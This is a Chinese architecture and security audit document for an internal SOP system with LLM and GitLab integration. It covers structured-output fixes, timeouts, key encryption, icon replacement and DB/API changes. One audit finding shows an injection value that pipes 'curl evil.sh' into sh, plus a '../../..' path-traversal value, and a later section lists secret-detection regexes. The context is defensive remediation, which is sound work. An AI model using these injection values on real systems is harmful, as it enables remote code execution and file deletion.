# sop-system 一期收尾 · 技术选型与架构约束（Phase 1 产出）

> 作者：高见远（首席架构师） | 版本：v1.0 | 状态：待 team-lead 裁决
> 本文是**契约**，不是建议书。Phase 2/3 的实现以此为唯一依据；与实现冲突时**先改本文再改代码**。

---

## 0. 版本锚定（按实际安装版本写，不得按印象写）

| 组件 | 锁定版本 | 来源 |
|---|---|---|
| Node.js | >= 18（依赖全局 `fetch`、`AbortSignal.timeout`） | 现有代码已用全局 fetch |
| express | ^4.21.2 | `server/package.json` |
| better-sqlite3 | ^13.0.2（**同步 API**） | `server/package.json` |
| react / react-dom | ^18.3.1 | `web/package.json` |
| typescript | ^5.6.3 | `web/package.json` |
| vite | ^5.4.11 | `web/package.json` |
| 模块规范 | server=CommonJS，web=ESM | `type` 字段 |
| **新增：lucide-react** | **^0.454.0（锁定，见 §5.4）** | 本次选型 |
| **新增：zod** | **^3.23.8（服务端，结构化输出校验）** | 本次选型 |

> 现有依赖极简（后端仅 2 个生产依赖）。本次**只增 2 个**：`zod`（后端）、`lucide-react`（前端）。不引入 AI SDK、不引入 ORM、不引入图标以外的 UI 库。

---

## 1. 现状核查：任务前提需要修正

任务书要求"调研 LLM 网关 / GitLab archive 的可行性"。**实际核查结果：这两块骨架已经写完了。**

| 任务书假设 | 实际情况 | 证据 |
|---|---|---|
| 需调研 LLM 多 Provider 接入 | 已实现 Anthropic + OpenAI 兼容双分支 | `server/src/ai.js:20-61` |
| 需调研 GitLab archive 快照 | 已实现下载/解压/提交号/文件计数 | `server/src/gitlab.js:72-109` |
| 需调研代码感知注入 prompt | 已实现目录树 + 关键文件启发式挑选 | `server/src/gitlab.js:127-196` |
| 需调研新增表可行性 | `code_modules`/`module_mappings` 已建 | `server/src/db.js:137-171` |
| 需调研密钥加密存储 | **未实现，明文入库** | `db.js:38`、`gitlab.js:22` |
| 失败自动降级 Mock | 已实现，但**静默且有契约缺陷** | `ai.js:57-60, 226` |

**所以 Phase 1 的真实价值不是"选型"，是"审计"**：现有实现能连通，但**一旦把真实 LLM 打开，AI 节点的产物契约会静默断裂**。下面 §2 是必须在 Phase 2 动工前解决的阻断项。

---

## 2. 阻断级问题（BLOCKER，不修则一期不可上线）

### BLOCKER-1：真实 LLM 一开启，AI 节点契约立即断裂（最高优先级）

**根因**：mock 路径返回**对象**，真实 LLM 路径返回**字符串**，而下游按对象消费。

证据链：

```js
// ai.js:226  真实 LLM → content 是 string
const real = await callLLM(sys, usr);
if (real) return { content: real, model: 'llm' };
// ai.js:231-235  mock → content 是 object
case 'EVALUATE': content = mockEvaluate(req, codeCtx); break;   // 返回 { level, effort, ... }
```

下游按对象消费，字符串上取属性全部得到 `undefined`：

| 位置 | 代码 | 真实 LLM 下的后果 |
|---|---|---|
| `engine.js:112` | `if (!content.pass && content.questions?.length)` | `undefined` → 条件为假 → **PRECHECK 门禁静默失效，需求无预检直接过** |
| `engine.js:118` | `if (content.level) touchReq(...)` | **改动等级 L1-L4 永不回填**，列表/详情的等级标签恒为空 |
| `engine.js:119` | `content.rationality?.verdict === 'NEED_CLARIFY'` | **AI 澄清闭环永不触发**，`clarifies` 表不再有 AI 提问 |
| `ReqDetail.tsx:66-71` | `JSON.parse(a.content)` 抛错 → `catch` 回退纯文本 | **EvaluationView 整块不渲染**：合理性判定、改动等级、人日预估、影响面表格全部消失 |

**危害等级**：这是**静默失效**——不报错、不抛异常、页面照常显示一坨 markdown。演示时"看起来接通了真实 AI"，实际产品核心价值（结构化评估 + 澄清门禁）全丢。这正是一期收尾最容易翻车的地方。

**修复方案**：见 §5.2 三级结构化输出策略。要求 `runAI()` 对 `PRECHECK/EVALUATE/TEST_CASE` **无论走哪条路径，一律返回通过 Zod 校验的对象**；校验不过就降级 mock 并记录原因。

---

### BLOCKER-2：降级不可观测，"没配密钥"和"密钥配错了"表现完全一样

```js
// ai.js:57-60
} catch (e) {
  console.error('[AI] LLM 调用失败,降级 mock:', e.message);
  return null;      // ← 只进 stdout，管理员在页面上永远看不到
}
```

更隐蔽的一条：**Anthropic 返回错误体时不会抛异常**。401/模型名错误时 `data.content` 是 `undefined`，`(undefined || []).map().join('\n')` 得到 `''`，`if (real)` 判空 → 一样悄悄降级 mock。`ai.js:40` 与 `ai.js:226` 联合造成这个盲区。

**修复**：
- `res.ok` 必须显式检查，非 2xx 抛出含状态码与响应体摘要的错误。
- 新增 `ai_task` 表落库：provider / model / status / degraded_reason / latency_ms / token 用量。
- 产物详情页展示来源徽标：`真实模型(claude-sonnet-4-5)` / `Mock(降级原因: 401 invalid api key)`。
- 管理后台「AI 模型配置」提供**连通性测试**按钮（对齐已有的 `GET /api/admin/gitlab/test`）。

---

### BLOCKER-3：LLM 调用无超时，请求可无限悬挂

Node 18+ 的全局 `fetch` **默认没有超时**。`ai.js:25` 与 `ai.js:43` 两处 fetch 均未设 `signal`。

调用链 `routes → engine.activateNode → runAiNode → runAI → fetch`，全程 `await`。对端不响应时 HTTP 请求永久挂起，连接持续堆积。DevPrompt 场景注入了最多 16000 字符代码上下文，本就是慢请求，风险更高。

**修复**：`signal: AbortSignal.timeout(ms)`，默认 60s，按 provider 可配；超时归入 BLOCKER-2 的 `degraded_reason`。

---

### BLOCKER-4：命令注入 + 路径穿越（GitLab 模块，可远程执行任意命令）

```js
// gitlab.js:85-91
const dest = path.join(REPOS_DIR, m.module_key);
const tmpTar = path.join(REPOS_DIR, `.tmp-${m.module_key}.tar.gz`);
execSync(`tar -xzf "${tmpTar}" -C "${dest}" --strip-components=1`);
```

`module_key` 来自管理员创建模块的入参（`admin.js:142` `POST /modules`），**入库前无任何格式校验**（`db.js:139` 仅 `TEXT UNIQUE NOT NULL`）。

- **命令注入**：`module_key = 'a"; curl evil.sh | sh; #'` → 拼进 `execSync` 的 shell 字符串直接执行。
- **路径穿越**：`module_key = '../../..'` → `fs.rmSync(dest, {recursive:true, force:true})`（`gitlab.js:86`）删除仓库目录外的内容。这行是**先删后建**，破坏力直接。
- 同类穿越还存在于 `sub_path` / `path_prefix`（`gitlab.js:128`、`gitlab.js:148` 直接 `path.join` 拼接）。

**修复（三道并上，缺一不可）**：
1. `module_key` 白名单校验 `^[a-z0-9][a-z0-9_-]{0,63}$`，API 入参 + DB `CHECK` 双层。
2. `execSync` 字符串形式改为 `execFileSync('tar', [...args])` 数组形式，**不经 shell**。
3. 解压目标做 `fs.realpathSync` 校验，必须落在 `REPOS_DIR` 前缀内，否则中止。`sub_path`/`path_prefix` 同样校验。

---

### BLOCKER-5：密钥与 Token 明文落盘

- `ai_providers.api_key`（`db.js:38`）明文。
- `settings['gitlab.token']`（`gitlab.js:22`）明文。

`sop.db` 是普通文件，且开了 WAL（`sop.db-wal` 同目录）。任何一次备份、拷贝、误提交仓库即全量泄露。任务书明确要求 AES 加密，当前为 0 实现。

注意 `gitlab.js:26` 的 `maskedCfg()` 只做了**展示层**打码（`'••••••••'`），存储层仍是明文——这容易让人误以为已经处理了。

**修复**：见 §5.3。

### BLOCKER-6：敏感配置文件随代码上下文直发外部 LLM（安全泄漏，F3 硬前置）

- `gitlab.js:123` `CODE_EXT` 白名单含 `.properties`/`.yml`/`.yaml`/`.xml`——这些是配置文件而非代码。
- `gitlab.js:124` `PRIORITY_RE` 含 `config`/`application` 关键词，`gitlab.js:155` 命中即 `score += 10`。
- `gitlab.js:156` 浅层减分（`score -= 路径深度`），`gitlab.js:158` 按分数降序排列。

**叠加后果**：Spring Boot 的 `application.properties`（含 `spring.datasource.password`、Redis 密钥、JWT secret 等）通常位于 `src/main/resources`（深度 2-3），命中 `application` → `+10`，净分 ~8；而深层 Controller（`src/main/java/.../controller/`，深度 6+）命中 `controller` → `+10`，净分 ~4。**敏感配置净分更高，排在 `keyFilesContent`（`gitlab.js:147`）返回数组首位**，随 `buildCodeContext`（`gitlab.js:175`）注入 prompt 直发 Claude/OpenAI。`.yml`/`.yaml`/`.xml` 同理：Nacos 配置、k8s Secret、logback 中的 `${...}` 凭据引用都可能命中。

F3（LLM 网关）一旦接通即瞬间泄漏生产凭证。**F2（敏感文件过滤）是 F3 的硬前置**——不先做 F2，F3 不能开。

**修复**：见 §5.7。

---

## 3. 高危约束（不阻断上线，但必须写进实现 Spec）

### 3.1 GitLab archive 官方限流：5 次/分钟/用户（硬约束）

来源：GitLab 官方文档 Repositories API 与 Rate limits 章节 —— "There is a rate limit for downloading repository archives... The rate limit is 5 requests per minute per user"，GitLab.com **不可配置**（自建实例管理员可关闭）。

推论（直接影响产品设计）：
- **一期不做"定时全量刷新所有模块"**。模块数一旦超过 5，定时任务会周期性撞 429，同步状态长期挂 FAILED。
- 同步必须**串行**执行，令牌桶间隔 >= 12s/次；遇 429 读 `Retry-After` 退避重试，最多 3 次。
- UI 上的「全部同步」按钮必须改成**排队提示**（"已加入队列，预计 N 分钟完成"），不能伪装成即时操作。

### 3.2 archive 支持 `path` 参数，当前实现浪费严重

官方 archive 端点支持 `path`（仓库子路径）与 `exclude_paths`。现有实现（`gitlab.js:81`）只传 `sha`，**全量下载整仓**，再靠本地 `sub_path` 取子目录（`gitlab.js:128`）。

monorepo 场景下这是数量级的浪费：下载量、磁盘占用、解压耗时全部按整仓计。
**修复**：`sub_path` 非空时下推到服务端 `?path=<sub_path>`，本地只做兜底裁剪。

### 3.3 无体积上限，大仓可打满磁盘

`gitlab.js:82` `Buffer.from(await res.arrayBuffer())` **把整个 tarball 读进内存**，再写盘，再解压。GB 级仓库会直接 OOM 打挂 Node 进程。

**修复**：下载前查 `Content-Length` 预检；落盘上限默认 200MB；解压后文件数上限默认 20000；超限标记 FAILED 并给出明确文案。流式下载（`Readable.fromWeb(res.body).pipe(...)`）优先于全量 buffer。

### 3.4 同步操作阻塞事件循环（单进程 Express 全站卡死）

`execSync`（`gitlab.js:91`）、`fs.readFileSync`（`gitlab.js:164`）、递归 `walk`（`gitlab.js:111`）全部是同步调用。Node 单线程，大仓解压 + 遍历期间**整个服务无法响应任何请求**，包括健康检查和前端静态资源。

better-sqlite3 本身同步是可接受的（毫秒级），但**文件 IO + 解压不是**。

**修复（一期最小代价）**：`execFileSync` → `child_process.spawn` 异步化；`walk`/`readFile` 改 `fs.promises`；同步任务进单并发队列，避免并行解压互相拖垮。

### 3.5 OpenAI 兼容协议的 JSON 能力严重分化（关键调研结论）

"OpenAI 兼容"只保证 `/v1/chat/completions` 的**基础字段**兼容，`response_format` 的支持度各家差异极大：

| Provider | `json_schema`（强约束） | `json_object`（弱约束） | 关键陷阱 |
|---|---|---|---|
| OpenAI | 支持（strict） | 支持 | — |
| Kimi / Moonshot | 支持（MFJS 方言） | 支持 | 复杂 schema 官方仍建议二次校验 |
| DeepSeek | **不支持** | 支持 | **prompt 必须出现 "json" 字面量** |
| 智谱 GLM | **不支持** | 支持 | 同上 |
| 通义千问 / 百炼 | **不支持** | 支持 | **思考模式下不保证输出合法 JSON** |
| 腾讯混元 | **不支持** | **不支持** | 接口无 `response_format` 字段 |
| MiniMax | **不支持** | **不支持** | 同上 |
| Anthropic | 支持（`output_config.format`，已 GA） | — | 老模型需用 `tool_choice` 强制工具调用替代 |

**必须内嵌进 Spec 的坑**：DeepSeek / GLM / 通义在启用 `json_object` 时，若 system/user 消息中**不含 "json" 字样**，API 直接返回 400（`'messages' must contain the word 'json'...`）。盲目全局加 `response_format` 会让这几家**全部报错**，反而不如不加。

**结论**：不存在"一套代码打通所有 Provider"。必须引入**能力矩阵 + 三级降级**（§5.2）。

### 3.6 已存在的功能性缺陷（顺手修）

- **`maxFiles` 参数被静默丢弃**：`ai.js:222` 传入 `{ withFiles: true, maxFiles: 6 }`，但 `withCodeContext` 签名只解构 `{ withFiles }`（`ai.js:206`），转调 `buildCodeContext(mids, { withFiles })` 时 `maxFiles` 丢失，实际always 用默认值 8（`gitlab.js:147`）。DevPrompt 的上下文预算控制目前是**失效**的。
- **API 无版本前缀**：现有全部端点挂在 `/api`（`index.js:10-11`），不符合团队 `/api/v1` 规范。见 §6.1 的务实迁移方案。
- **`requirements.module_ids` 冗余列与 `requirement_modules` 表双写**：`ai.js:207` 读的是冗余列 `req.module_ids`，而关系真值在 `requirement_modules` 表（`db.js:166`）。两者不同步时代码感知会取错模块。建议以关系表为准，冗余列由服务层统一维护或废弃。

---

## 4. P0 绝对规则合规审计：当前**不合规**

全项目 emoji 用作功能图标共 **46 处**：

| 文件 | 数量 | 用途 |
|---|---|---|
| `web/src/pages/Board.tsx` | 35 | 角色图标、节点类型图标、统计卡图标、栏目标题 |
| `web/src/pages/ReqList.tsx` | 9 | 状态分组标题 |
| `web/src/pages/CreateModal.tsx` | 1 | — |
| `server/src/gitlab.js` | 1 | 目录树 `'📁 '`（`gitlab.js:139`，会注入进 LLM prompt） |

**特别提示（改造成本被低估的地方）**：`ReqList.tsx` 的 emoji 不是纯装饰，而是**参与业务逻辑**——

```js
// ReqList.tsx:50-57
const key = r.status === 'DONE' ? '✅ 已完成' : r.status === 'CANCELLED' ? '🚫 已取消' : ...;
order.sort((a, b) => (a.startsWith('✅') || a.startsWith('🚫') ? 1 : 0) - ...);
```

emoji 被拼进**分组 key 字符串**，排序谓词用 `startsWith('✅')` 判断。直接删 emoji 会**同时破坏分组与排序**。必须重构为 `{ key: 'DONE', label: '已完成', icon: CheckCircle2, weight: 1 }` 的结构化描述，再渲染。这条要明确交代给前端，否则大概率被当成"替换字符"草率处理。

图标库选型见 §5.4，emoji → 图标映射表见 §5.5。

---

## 5. 选型矩阵与结论

### 5.1 LLM 统一抽象层

| 维度（权重） | A. 自研轻量 Adapter | B. Vercel AI SDK / LangChain.js | C. 自建 OneAPI/LiteLLM 代理 |
|---|---|---|---|
| 学习成本（高） | 5（已有雏形） | 3（新概念栈） | 3（新组件运维） |
| 生态成熟度（高） | 3 | 5 | 4 |
| 部署成本（高） | 5（零新增） | 4（依赖树大） | 2（多一个进程/容器） |
| 与现有代码契合（高） | 5（CJS 直接改） | 2（**ESM-only，与 CJS 后端冲突**） | 4（仅改 base_url） |
| 一期需求覆盖（高） | 5（只需 2 种协议） | 5 | 5 |
| 扩展性（低） | 3 | 5 | 5 |
| **加权结论** | **胜出** | 依赖与模块规范冲突 | MVP 阶段运维不划算 |

**结论：A. 自研轻量 Adapter。** 理由：
1. `ai.js` 已是雏形，改造成本远低于替换；
2. 后端是 CommonJS，Vercel AI SDK 主线 ESM-only，引入需改造整个后端模块规范，性价比极低；
3. 一期只需 Anthropic Messages + OpenAI Chat Completions 两种协议，抽象层不到 200 行；
4. 方案 C 的多进程运维成本对当前规模是过度设计——但**保留兼容性**：Adapter 的 `base_url` 可配置，未来想换 OneAPI 只需改配置，不改代码。

**落地结构**（遵循 code-organization 分层与 300 行硬上限）：
```
server/src/llm/
├── index.js              # 出口：createProvider(config) 工厂
├── capabilities.js       # Provider 能力矩阵（§3.5 表格的代码化）
├── providers/
│   ├── anthropic.js      # Messages API + output_config.format
│   ├── openai-compat.js  # Chat Completions + response_format 分级
│   └── mock.js           # 内置 mock（从 ai.js 拆出）
└── structured.js         # 三级结构化输出 + Zod 校验 + 重试
```

### 5.2 结构化输出策略（BLOCKER-1 的根治方案）

**三级降级，逐级放宽约束；无论走哪级，出口一律过同一个 Zod schema。**

| 级别 | 手段 | 适用 Provider |
|---|---|---|
| **L1 原生强约束** | Anthropic `output_config.format={type:'json_schema'}`；OpenAI/Kimi `response_format={type:'json_schema',strict:true}` | Anthropic 全系、OpenAI、Kimi |
| **L2 弱约束** | `response_format={type:'json_object'}`，并**自动确保 prompt 含 "json" 字面量**（规避 §3.5 的 400） | DeepSeek、GLM、通义 |
| **L3 纯提示词兜底** | schema 内嵌 prompt + 抽取首个 ` ```json ` 代码块或首个平衡 `{...}` + 校验失败带错误信息重试 1 次 | 混元、MiniMax、未知自建网关 |

出口统一校验：
```js
const parsed = EvaluationSchema.safeParse(raw);
if (!parsed.success) return degradeToMock('schema_validation_failed', parsed.error);
return parsed.data;   // engine.js 拿到的永远是合法对象
```

这样 `engine.js:112/118/119` 的对象访问在真实 LLM 下同样成立，`ReqDetail.tsx` 的 `JSON.parse` 恒成功，**BLOCKER-1 根治**。

**Schema 覆盖范围**：`PRECHECK`、`EVALUATE`、`TEST_CASE` 三个动作**必须**结构化（下游按对象消费）。`PRD_GEN`、`DEV_PROMPT` 产物本身就是 Markdown 文本，**保持字符串**，不强套 JSON——避免为了统一而统一。

### 5.3 密钥加密存储

| 方案 | 可逆 | 密钥管理 | MVP 适配 | 结论 |
|---|---|---|---|---|
| A. AES-256-GCM（`node:crypto` 内置） | 是 | 主密钥走环境变量 | 零新增依赖 | **选中** |
| B. bcrypt/argon2 哈希 | **否** | — | — | **不可用**（见下） |
| C. 云 KMS / Vault | 是 | 托管 | 需外部服务、联网 | 一期过重 |

**必须点明**：API Key 与 GitLab Token 是**要拿去调用第三方的凭据，必须可逆解密**。哈希类方案（bcrypt/argon2/SHA）在此场景**根本不可用**——这是个常见误用，明确写进 Spec 防止开发想当然套用密码存储的做法。

实现约束：
- 算法 `aes-256-gcm`，每条记录独立随机 12 字节 IV，存储格式 `v1:<iv_b64>:<tag_b64>:<cipher_b64>`（带版本前缀，便于未来轮换）。
- 主密钥来自环境变量 `SOP_MASTER_KEY`（32 字节，base64）。**不入库、不入仓、不写进配置文件**；缺失时服务启动即失败并给出明确指引（fail-fast，不要静默降级成明文）。
- 读取路径：`decrypt()` 只在真正发起调用前执行，不进日志、不进 API 响应。
- 对外一律返回掩码（沿用已有 `maskedCfg()` 风格），且 `'••••••••'` 作为"未修改"哨兵值的约定要保留（`gitlab.js:22` 已这么做）。
- **迁移**：启动时检测存量明文（无 `v1:` 前缀）→ 自动加密回写一次，日志记录条数。

**补充（pm 安全审计，users.password）**：上述可逆加密仅适用于 API Key / Token 等需还原调用的凭据。`users.password`（`db.js:16`）是**登录口令，必须用不可逆哈希**——bcrypt（cost=10）。`routes.js:25` 当前 `WHERE username=? AND password=?` 明文比对，改造为先按 username 查行，再 `bcrypt.compare(input, row.password)`。存量明文密码需一次性哈希化迁移（MVP 用户量少，管理员重置即可）。工作量 ~1 人日。此条扩展了 BLOCKER-5 的范围（原仅覆盖 api_key / gitlab token）。

### 5.4 前端 SVG 图标库（P0 强制锁定）

| 维度 | A. lucide-react | B. @heroicons/react | C. @tabler/icons-react |
|---|---|---|---|
| 许可证 | ISC（宽松） | MIT | MIT |
| 图标数量 | ~1500 | ~300 | ~5800 |
| Tree-shaking | 支持（ESM 具名导出） | 支持 | 支持 |
| 单图标体积 | ~1KB | ~1KB | ~1KB |
| 业务语义覆盖 | 角色/流程/状态/代码/AI 全覆盖 | 偏通用，流程类偏少 | 覆盖最广但风格偏细线 |
| 视觉一致性 | 统一 24×24 / stroke 2 | 统一 | 统一 |
| React 18 兼容 | 是 | 是 | 是 |
| 包体积（全量） | 中 | 小 | 大（5800 图标） |

**结论：锁定 `lucide-react@^0.454.0`。**

理由：ISC 许可无商用顾虑；1500 图标足够覆盖本项目全部语义（角色、SOP 节点、AI、代码仓库、同步状态）且不像 Tabler 那样臃肿；stroke-2 的视觉重量与当前后台风格一致；具名导入天然 tree-shaking，实际打包只含用到的图标。

**强制条款**：
1. 全项目**只用这一套**，禁止混用其他图标库。
2. 禁止任何 emoji 作为功能图标（含服务端生成、会被展示的文本，如 `gitlab.js:139` 的目录树）。
3. 图标统一经 `web/src/components/Icon.tsx` 收口（统一 size/stroke/color），页面不直接从 `lucide-react` 散引，便于后续统一换库或调风格。
4. 装饰性/情绪化文案中的 emoji 一并清除，避免"图标不用 emoji 但文案还在用"的半吊子状态。

### 5.5 emoji → lucide 图标映射表（交付给前端直接执行）

> **合规说明**：下表「现状 emoji」列中的字符是**待清除的对象**，作为定位证据引用，
> 不构成本文档对 emoji 的使用或认可。P0 合规门禁（§9）只扫描 `web/src` 与 `server/src`，
> 不扫描 `docs/`——否则无法书写清除映射表。

| 现状 emoji | 语义 | lucide 图标 | 出现位置 |
|---|---|---|---|
| `📣` | CSM 角色 | `Megaphone` | Board.tsx:48 |
| `📋` | PO 角色 | `ClipboardList` | Board.tsx:48 |
| `💻` | RD 角色 | `Code2` | Board.tsx:48 |
| `🧪` | QA 角色 | `FlaskConical` | Board.tsx:48, 167, 169 |
| `🤖` | AI 节点 | `Bot` | Board.tsx:51, 145, 158 |
| `📌` | 通用节点/待处理 | `Pin` / `CircleDot` | Board.tsx:52, 128, 154, 156 |
| `✓` `✅` | 完成 | `CheckCircle2` | Board.tsx:68, 146, 172, 241；ReqList.tsx:50 |
| `●` | 进行中 | `Circle`（filled） | Board.tsx:68 |
| `🚫` | 已取消 | `Ban` | ReqList.tsx:51 |
| `🏢` | 客户 | `Building2` | Board.tsx:89 |
| `✦` | 新建 | `Plus` | Board.tsx:127 |
| `🔥` | 进行中（栏目） | `Flame` → 建议改 `Activity` | Board.tsx:128, 180 |
| `📥` | 收件/待处理 | `Inbox` | Board.tsx:130, 141, 143 |
| `💬` | 待澄清 | `MessageCircleQuestion` | Board.tsx:132, 171, 180, 184 |
| `🚀` | 已上线 | `Rocket` → 建议改 `CircleCheckBig` | Board.tsx:133, 159, 185 |
| `📝` | PRD/编辑 | `FileText` | Board.tsx:141 |
| `🔨` | 开发中 | `Hammer` → 建议改 `Wrench` | Board.tsx:154 |
| `🔁` | 回归/循环 | `RefreshCw` | Board.tsx:167 |
| `📦` | 需求总量 | `Package` | Board.tsx:182 |
| `📁` | 目录（服务端） | 改为纯文本 `[D]` / `[F]` 前缀 | gitlab.js:139 |

> `gitlab.js:139` 的目录树是喂给 LLM 的文本，不是 UI。不要在这里塞 SVG——改成 ASCII 前缀 `[D]`/`[F]` 即可，既守规则又省 token。

### 5.6 代码感知策略（一期不做向量化，确认可行）

| 方案 | 实现成本 | 效果 | 一期结论 |
|---|---|---|---|
| A. 目录树 + 关键文件启发式（现状） | 已完成 | 中等，够用 | **维持**，修 §3.6 的 maxFiles 缺陷 |
| B. 向量化 RAG（pgvector/本地向量库） | 高（要 embedding、要向量库、SQLite 无原生向量） | 高 | **一期不做**（任务书已明确） |
| C. AST 符号索引（tree-sitter） | 中高 | 高（精确到符号） | 二期候选 |

现有启发式（`gitlab.js:124` 的 `PRIORITY_RE` 命中 Controller/Service/Entity/Api/Handler + 浅层优先）方向正确。一期只需补：
- Token 预算真正生效（修 `maxFiles` 丢弃 bug）；
- 预算按 provider 上下文窗口动态计算，而非写死 16000 字符；
- 命中文件清单要**回显给用户**（当前用户不知道 AI 到底看了哪些文件，无法判断结论可信度）。这条对"让 AI 长在真实代码上"的可信度至关重要。

### 5.7 敏感文件过滤（F2，BLOCKER-6 根治，F3 硬前置）

| 方案 | 拦截强度 | 实现成本 | 一期结论 |
|---|---|---|---|
| A. 扩展名 + 文件名黑名单（注入前剔除） | 高 | 低 | **选中**（L1） |
| B. 内容嗅探脱敏（保留文件、替换敏感值） | 中高 | 中 | **选中**（L2，兜底） |
| C. 配置文件语义解析（只提取非敏感结构） | 高 | 高 | 二期候选 |

**L1：注入前剔除（在 `keyFilesContent` 评分前 filter）**

采用**文件名正则**而非纯扩展名（`.xml`/`.yml` 可能是 pom.xml、webpack 配置，需精确判定）：

- `/^application[-.]?.*\.(properties|yml|yaml)$/i`（Spring Boot 配置）
- `/^bootstrap[-.]?.*\.(yml|yaml)$/i`（Spring Cloud 启动配置）
- `/^logback.*\.xml$/i`（日志配置含凭据引用）
- `/^(nacos|sentinel|seata).*(\.properties|\.yml|\.yaml)$/i`
- `/credentials?\./i`、`/secrets?\./i`
- `/.*\.(env|key|pem|p12|jks|pfx|crt|cer)$/i`

命中即从 `scored` 数组移除，不进入 prompt（不影响本地磁盘留存）。

**L2：内容嗅探脱敏（对 L1 未剔除的文件，读取后正则替换敏感值为 `***REDACTED***`）**

保留文件结构、只抹值，不影响 AI 理解代码骨架：

- `password\s*[:=]\s*\S+` → `password: ***REDACTED***`
- `secret\s*[:=]\s*\S+`、`api[_-]?key\s*[:=]\s*\S+`、`token\s*[:=]\s*\S+`
- `AKIA[0-9A-Z]{16}`（AWS Access Key ID）
- `-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END[A-Z ]*PRIVATE KEY-----`

**实现位置**：`gitlab.js` 新增 `isSensitiveFile(relPath)` 与 `redactSecrets(content)` 两个纯函数，在 `keyFilesContent`（`gitlab.js:147`）的 `walk(root).filter(...)`（`:150`）之后、`scored`（`:152`）之前插入 `!isSensitiveFile(rel)` 过滤；在 `content = fs.readFileSync(...)`（`:164`）之后追加 `content = redactSecrets(content)`。两个函数纯函数化，便于单测覆盖正则测试集。

**工作量**：~1.5 人日（含正则测试集）。
**与 F9（打回改造）解耦**：F2 改动局限在 `keyFilesContent` 内部，对外接口形状（`{ path, content }[]`）不变，打回流程零影响——pm 担心的 F2 与 F9 打回改造合并风险**不存在**，二者可并行。

---

## 6. API 与数据库草案

### 6.1 API 版本化：务实迁移方案

现状全部挂 `/api`（`index.js:10-11`），团队规范要求 `/api/v1`。**全量改会动前端每一处调用**，收益低风险高。

**方案**：`app.use('/api/v1', router); app.use('/api', router);` —— 同一个 router 双挂载。新增端点文档一律以 `/api/v1` 为准，前端新代码用 `/api/v1`，存量调用保持可用，逐步迁移。零破坏、零额外成本。

### 6.2 新增端点（详见 `docs/openapi.yaml`）

| Method | Path | 说明 |
|---|---|---|
| GET | `/api/v1/admin/ai-providers` | 列表（密钥掩码） |
| POST | `/api/v1/admin/ai-providers` | 新增（密钥加密入库） |
| PUT | `/api/v1/admin/ai-providers/{id}` | 更新（`••••••••` 表示不改密钥） |
| DELETE | `/api/v1/admin/ai-providers/{id}` | 删除 |
| POST | `/api/v1/admin/ai-providers/{id}/test` | **新增**：连通性测试，返回延迟/模型/能力探测 |
| GET | `/api/v1/admin/ai-tasks` | **新增**：AI 调用记录（含降级原因），支持分页筛选 |
| POST | `/api/v1/admin/modules/{id}/sync` | 触发同步（改为**入队**语义，返回 task_id） |
| GET | `/api/v1/admin/sync-tasks/{id}` | **新增**：同步任务状态轮询 |
| GET | `/api/v1/requirements/{id}/code-context` | **新增**：回显本次 AI 实际读取的文件清单 |

统一响应包络沿用团队规范 `{ code, data, message }`。**注意**：现有端点是裸 JSON（如 `routes.js:35` `res.json(req.user)`），**新端点用包络、老端点不动**，避免大规模回归。这条要在 Spec 里写死，否则前端会混淆。

### 6.3 数据库增量 DDL

```sql
-- 1) AI 调用记录（BLOCKER-2 可观测性基础）
CREATE TABLE IF NOT EXISTS ai_tasks (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  requirement_id INTEGER REFERENCES requirements(id) ON DELETE CASCADE,
  node_id INTEGER REFERENCES sop_nodes(id),
  action TEXT NOT NULL,                     -- PRECHECK/EVALUATE/PRD_GEN/DEV_PROMPT/TEST_CASE/CUSTOM
  provider_id INTEGER REFERENCES ai_providers(id),
  provider_type TEXT,                       -- anthropic/openai-compat/mock
  model TEXT,
  status TEXT NOT NULL,                     -- OK / DEGRADED / FAILED
  degraded_reason TEXT,                     -- 401 / timeout / schema_validation_failed / no_provider
  structured_level TEXT,                    -- L1/L2/L3/mock（实际生效的结构化级别）
  latency_ms INTEGER,
  prompt_tokens INTEGER,
  completion_tokens INTEGER,
  code_files_used TEXT,                     -- JSON 数组：本次注入的文件相对路径
  created_at TEXT DEFAULT (datetime('now','localtime'))
);
CREATE INDEX IF NOT EXISTS idx_ai_task_req ON ai_tasks(requirement_id, created_at);
CREATE INDEX IF NOT EXISTS idx_ai_task_status ON ai_tasks(status);

-- 2) ai_providers 增量（不重建表，走 ALTER 迁移，与 db.js:184 现有风格一致）
ALTER TABLE ai_providers ADD COLUMN api_key_enc TEXT;      -- v1:iv:tag:cipher
ALTER TABLE ai_providers ADD COLUMN timeout_ms INTEGER DEFAULT 60000;
ALTER TABLE ai_providers ADD COLUMN max_tokens INTEGER DEFAULT 4096;
ALTER TABLE ai_providers ADD COLUMN capability TEXT;        -- JSON：{json_schema:bool,json_object:bool}
ALTER TABLE ai_providers ADD COLUMN priority INTEGER DEFAULT 0;  -- 多 Provider 降级顺序
ALTER TABLE ai_providers ADD COLUMN last_tested_at TEXT;
ALTER TABLE ai_providers ADD COLUMN last_test_result TEXT;

-- 3) code_modules 增量：安全与配额
ALTER TABLE code_modules ADD COLUMN max_archive_mb INTEGER DEFAULT 200;
ALTER TABLE code_modules ADD COLUMN last_sync_task_id INTEGER;
-- module_key 白名单：SQLite 无法对已有表加 CHECK，改由服务层 + 新建表 CHECK 保证

-- 4) 同步任务队列（§3.1 限流串行化的载体）
CREATE TABLE IF NOT EXISTS sync_tasks (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  module_id INTEGER NOT NULL REFERENCES code_modules(id) ON DELETE CASCADE,
  status TEXT NOT NULL DEFAULT 'QUEUED',    -- QUEUED/RUNNING/OK/FAILED
  attempt INTEGER DEFAULT 0,
  error_msg TEXT,
  started_at TEXT,
  finished_at TEXT,
  created_at TEXT DEFAULT (datetime('now','localtime'))
);
CREATE INDEX IF NOT EXISTS idx_sync_task_status ON sync_tasks(status, created_at);
```

**关于任务书提到的 `repo_config` / `platform_module` / `code_module` 表**：现有 `code_modules` + `module_mappings` + `settings['gitlab.*']` 已完整覆盖这三者的职责，**不新建重复表**。避免同一概念两套存储导致数据漂移——这正是 §3.6 里 `module_ids` 双写已经踩过的坑，不要再犯第二次。

### 6.4 可行性结论：better-sqlite3 承载新增表

**可行，无风险。** 依据：
- 新增 2 张表 + 11 个列，均为低频写入（AI 调用记录按需求量级，日均 < 千行）；
- WAL 已开启（`db.js:9`），读写并发足够；
- 现有 `try { ALTER TABLE ... } catch {}` 迁移风格（`db.js:184-187`）可直接复用，幂等；
